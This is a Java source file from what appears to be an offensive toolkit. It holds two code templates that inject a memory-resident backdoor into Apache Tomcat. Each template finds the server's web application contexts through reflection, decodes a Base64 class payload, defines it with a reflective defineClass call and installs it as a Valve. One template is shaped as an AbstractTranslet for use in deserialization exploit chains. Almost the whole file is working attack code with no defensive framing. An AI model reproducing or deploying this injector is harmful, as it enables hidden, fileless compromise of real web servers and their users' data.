package com.droplab.Utils.Memory.Tomcat.Valve;

import com.droplab.Utils.Memory.Interface.ImplInterface;

import java.lang.reflect.Field;

public class addValve implements ImplInterface {
    private final String addValveStrTomcat="import org.apache.catalina.Valve;\n" +
            "import org.apache.catalina.core.StandardContext;\n" +
            "import org.apache.catalina.core.StandardEngine;\n" +
            "import org.apache.catalina.core.StandardHost;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.*;\n" +
            "public class %s {\n" +
            "    private String uri;\n" +
            "    private String serverName;\n" +
            "    private ArrayList<StandardContext> standardContext_ = new ArrayList<>();\n" +
            "    private ArrayList<StandardContext> standardContext__ = new ArrayList<>();\n" +
            "\n" +
            "    public %s() {\n" +
            "        super();\n" +
            "        this.getThread();\n" +
            "        ArrayList<StandardContext> standardCtx = this.getSTC();\n" +
            "        String s = \"%s\";\n" +
            "        Object o=null;\n" +
            "        try {\n" +
            "            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            byte[] d = java.util.Base64.getDecoder().decode(s);\n" +
            "            Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "            Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass.setAccessible(true);\n" +
            "            o = ((Class) defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();\n" +
            "        } catch (Exception e) { }\n" +
            "        for (StandardContext standardCtx_ : standardCtx) {\n" +
            "            try { standardCtx_.addValve((Valve) o); }catch (Exception e){ continue; }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public Object getField(Object object, String fieldName) {\n" +
            "        Field declaredField;\n" +
            "        Class clazz = object.getClass();\n" +
            "        while (clazz != Object.class) {\n" +
            "            try {\n" +
            "                declaredField = clazz.getDeclaredField(fieldName);\n" +
            "                declaredField.setAccessible(true);\n" +
            "                return declaredField.get(object);\n" +
            "            } catch (NoSuchFieldException e) {\n" +
            "            } catch (IllegalAccessException e) {\n" +
            "            }\n" +
            "            clazz = clazz.getSuperclass();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public void getThread() {\n" +
            "        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "        Object object;\n" +
            "        for (Thread thread : threads) {\n" +
            "            if (thread == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            if (thread.getName().contains(\"exec\")) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            Object target = this.getField(thread, \"target\");\n" +
            "            if (!(target instanceof Runnable)) {\n" +
            "                continue;\n" +
            "            }\n" +
            "\n" +
            "            try {\n" +
            "                object = getField(getField(getField(target, \"this$0\"), \"handler\"), \"global\");\n" +
            "            } catch (Exception e) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            if (object == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            java.util.ArrayList processors = (java.util.ArrayList) getField(object, \"processors\");\n" +
            "            Iterator iterator = processors.iterator();\n" +
            "            while (iterator.hasNext()) {\n" +
            "                Object next = iterator.next();\n" +
            "                Object req = getField(next, \"req\");\n" +
            "                Object serverPort = getField(req, \"serverPort\");\n" +
            "                if (serverPort.equals(-1)) {\n" +
            "                    continue;\n" +
            "                }\n" +
            "                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, \"serverNameMB\");\n" +
            "                this.serverName = (String) getField(serverNameMB, \"strValue\");\n" +
            "                if (this.serverName == null) {\n" +
            "                    this.serverName = serverNameMB.toString();\n" +
            "                }\n" +
            "                if (this.serverName == null) {\n" +
            "                    this.serverName = serverNameMB.getString();\n" +
            "                }\n" +
            "\n" +
            "                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, \"uriMB\");\n" +
            "                this.uri = (String) getField(uriMB, \"strValue\");\n" +
            "                if (this.uri == null) {\n" +
            "                    this.uri = uriMB.toString();\n" +
            "                }\n" +
            "                if (this.uri == null) {\n" +
            "                    this.uri = uriMB.getString();\n" +
            "                }\n" +
            "\n" +
            "                this.getStandardContext();\n" +
            "                return;\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public void getStandardContext() {\n" +
            "        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "        for (Thread thread : threads) {\n" +
            "            if (thread == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            if ((thread.getName().contains(\"Acceptor\")) && (thread.getName().contains(\"http\"))) {\n" +
            "                Object target = this.getField(thread, \"target\");\n" +
            "                HashMap children;\n" +
            "                Object jioEndPoint = null;\n" +
            "                try {\n" +
            "                    jioEndPoint = getField(target, \"this$0\");\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "                if (jioEndPoint == null) {\n" +
            "                    try {\n" +
            "                        jioEndPoint = getField(target, \"endpoint\");\n" +
            "                    } catch (Exception e) {\n" +
            "                        return;\n" +
            "                    }\n" +
            "                }\n" +
            "                Object service = getField(getField(getField(getField(getField(jioEndPoint, \"handler\"), \"proto\"), \"adapter\"), \"connector\"), \"service\");\n" +
            "                StandardEngine engine = null;\n" +
            "                try {\n" +
            "                    engine = (StandardEngine) getField(service, \"container\");\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "                if (engine == null) {\n" +
            "                    engine = (StandardEngine) getField(service, \"engine\");\n" +
            "                }\n" +
            "                children = (HashMap) getField(engine, \"children\");\n" +
            "\n" +
            "                StandardHost standardHost = null;\n" +
            "                Iterator<Map.Entry<String, StandardHost>> entryIterator = children.entrySet().iterator();\n" +
            "                while (entryIterator.hasNext()) {\n" +
            "                    Map.Entry<String, StandardHost> entry = entryIterator.next();\n" +
            "                    standardHost = entry.getValue();\n" +
            "                    children = (HashMap) getField(standardHost, \"children\");\n" +
            "                    Iterator iterator = children.keySet().iterator();\n" +
            "                    while (iterator.hasNext()) {\n" +
            "                        String contextKey = (String) iterator.next();\n" +
            "                        if (!(this.uri.startsWith(contextKey))) {\n" +
            "                            continue;\n" +
            "                        }\n" +
            "                        StandardContext standardContext = (StandardContext) children.get(contextKey);\n" +
            "                        this.standardContext_.add(standardContext);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public ArrayList<StandardContext> getSTC() {\n" +
            "        for (int i = 0; i < this.standardContext_.size(); i++) {\n" +
            "            if (!this.standardContext__.contains(this.standardContext_.get(i)))\n" +
            "                this.standardContext__.add(this.standardContext_.get(i));\n" +
            "        }\n" +
            "        return this.standardContext__;\n" +
            "    }\n" +
            "}";

    private final String addValveStrTomcatTemplate="import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "import org.apache.catalina.Valve;\n" +
            "import org.apache.catalina.core.StandardContext;\n" +
            "import org.apache.catalina.core.StandardEngine;\n" +
            "import org.apache.catalina.core.StandardHost;\n" +
            "\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.*;\n" +
            "\n" +
            "public class %s extends AbstractTranslet {\n" +
            "    private String uri;\n" +
            "    private String serverName;\n" +
            "    private ArrayList<StandardContext> standardContext_ = new ArrayList<>();\n" +
            "    private ArrayList<StandardContext> standardContext__ = new ArrayList<>();\n" +
            "\n" +
            "    public %s() {\n" +
            "        super();\n" +
            "        this.getThread();\n" +
            "        ArrayList<StandardContext> standardCtx = this.getSTC();\n" +
            "        String s = \"%s\";\n" +
            "        Object o = null;\n" +
            "        try {\n" +
            "            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            byte[] d = java.util.Base64.getDecoder().decode(s);\n" +
            "            Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "            Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass.setAccessible(true);\n" +
            "            o = ((Class) defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        for (StandardContext standardCtx_ : standardCtx) {\n" +
            "            try {\n" +
            "                standardCtx_.addValve((Valve) o);\n" +
            "            } catch (Exception e) {\n" +
            "                continue;\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }\n" +
            "\n" +
            "    public Object getField(Object object, String fieldName) {\n" +
            "        Field declaredField;\n" +
            "        Class clazz = object.getClass();\n" +
            "        while (clazz != Object.class) {\n" +
            "            try {\n" +
            "                declaredField = clazz.getDeclaredField(fieldName);\n" +
            "                declaredField.setAccessible(true);\n" +
            "                return declaredField.get(object);\n" +
            "            } catch (NoSuchFieldException e) {\n" +
            "            } catch (IllegalAccessException e) {\n" +
            "            }\n" +
            "            clazz = clazz.getSuperclass();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public void getThread() {\n" +
            "        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "        Object object;\n" +
            "        for (Thread thread : threads) {\n" +
            "            if (thread == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            if (thread.getName().contains(\"exec\")) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            Object target = this.getField(thread, \"target\");\n" +
            "            if (!(target instanceof Runnable)) {\n" +
            "                continue;\n" +
            "            }\n" +
            "\n" +
            "            try {\n" +
            "                object = getField(getField(getField(target, \"this$0\"), \"handler\"), \"global\");\n" +
            "            } catch (Exception e) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            if (object == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            java.util.ArrayList processors = (java.util.ArrayList) getField(object, \"processors\");\n" +
            "            Iterator iterator = processors.iterator();\n" +
            "            while (iterator.hasNext()) {\n" +
            "                Object next = iterator.next();\n" +
            "                Object req = getField(next, \"req\");\n" +
            "                Object serverPort = getField(req, \"serverPort\");\n" +
            "                if (serverPort.equals(-1)) {\n" +
            "                    continue;\n" +
            "                }\n" +
            "                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, \"serverNameMB\");\n" +
            "                this.serverName = (String) getField(serverNameMB, \"strValue\");\n" +
            "                if (this.serverName == null) {\n" +
            "                    this.serverName = serverNameMB.toString();\n" +
            "                }\n" +
            "                if (this.serverName == null) {\n" +
            "                    this.serverName = serverNameMB.getString();\n" +
            "                }\n" +
            "\n" +
            "                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, \"uriMB\");\n" +
            "                this.uri = (String) getField(uriMB, \"strValue\");\n" +
            "                if (this.uri == null) {\n" +
            "                    this.uri = uriMB.toString();\n" +
            "                }\n" +
            "                if (this.uri == null) {\n" +
            "                    this.uri = uriMB.getString();\n" +
            "                }\n" +
            "\n" +
            "                this.getStandardContext();\n" +
            "                return;\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public void getStandardContext() {\n" +
            "        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "        for (Thread thread : threads) {\n" +
            "            if (thread == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            if ((thread.getName().contains(\"Acceptor\")) && (thread.getName().contains(\"http\"))) {\n" +
            "                Object target = this.getField(thread, \"target\");\n" +
            "                HashMap children;\n" +
            "                Object jioEndPoint = null;\n" +
            "                try {\n" +
            "                    jioEndPoint = getField(target, \"this$0\");\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "                if (jioEndPoint == null) {\n" +
            "                    try {\n" +
            "                        jioEndPoint = getField(target, \"endpoint\");\n" +
            "                    } catch (Exception e) {\n" +
            "                        return;\n" +
            "                    }\n" +
            "                }\n" +
            "                Object service = getField(getField(getField(getField(getField(jioEndPoint, \"handler\"), \"proto\"), \"adapter\"), \"connector\"), \"service\");\n" +
            "                StandardEngine engine = null;\n" +
            "                try {\n" +
            "                    engine = (StandardEngine) getField(service, \"container\");\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "                if (engine == null) {\n" +
            "                    engine = (StandardEngine) getField(service, \"engine\");\n" +
            "                }\n" +
            "                children = (HashMap) getField(engine, \"children\");\n" +
            "\n" +
            "                StandardHost standardHost = null;\n" +
            "                Iterator<Map.Entry<String, StandardHost>> entryIterator = children.entrySet().iterator();\n" +
            "                while (entryIterator.hasNext()) {\n" +
            "                    Map.Entry<String, StandardHost> entry = entryIterator.next();\n" +
            "                    standardHost = entry.getValue();\n" +
            "                    children = (HashMap) getField(standardHost, \"children\");\n" +
            "                    Iterator iterator = children.keySet().iterator();\n" +
            "                    while (iterator.hasNext()) {\n" +
            "                        String contextKey = (String) iterator.next();\n" +
            "                        if (!(this.uri.startsWith(contextKey))) {\n" +
            "                            continue;\n" +
            "                        }\n" +
            "                        StandardContext standardContext = (StandardContext) children.get(contextKey);\n" +
            "                        this.standardContext_.add(standardContext);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public ArrayList<StandardContext> getSTC() {\n" +
            "        for (int i = 0; i < this.standardContext_.size(); i++) {\n" +
            "            if (!this.standardContext__.contains(this.standardContext_.get(i)))\n" +
            "                this.standardContext__.add(this.standardContext_.get(i));\n" +
            "        }\n" +
            "        return this.standardContext__;\n" +
            "    }\n" +
            "}";

    @Override
    public String get(Object obj, String type,boolean template) {
        try {
            Field declaredField = null;
            if(template){
                declaredField = obj.getClass().getDeclaredField("addValveStr"+type+"Template");
            }else {
                declaredField = obj.getClass().getDeclaredField("addValveStr"+type);
            }
            declaredField.setAccessible(true);
            return (String) declaredField.get(obj);
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public static void main(String[] args) {
        addValve addValve = new addValve();
        System.out.println(addValve.addValveStrTomcatTemplate);
    }
}
